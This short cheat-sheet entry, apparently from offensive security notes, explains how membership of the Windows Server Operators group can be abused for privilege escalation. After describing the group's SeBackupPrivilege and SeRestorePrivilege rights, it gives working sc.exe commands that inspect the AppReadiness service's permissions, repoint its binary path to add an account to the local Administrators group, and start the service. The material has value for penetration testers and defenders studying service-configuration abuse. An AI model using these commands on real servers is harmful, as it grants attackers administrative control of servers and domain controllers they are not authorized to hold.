The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

#### Leveraging membership

Check permissions for service running as system. Looking or **RPWP**
```powershell
 sc.exe sdshow AppReadiness
```

Modify service binary path
```powershell
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Start service
```powershell
sc start AppReadiness
```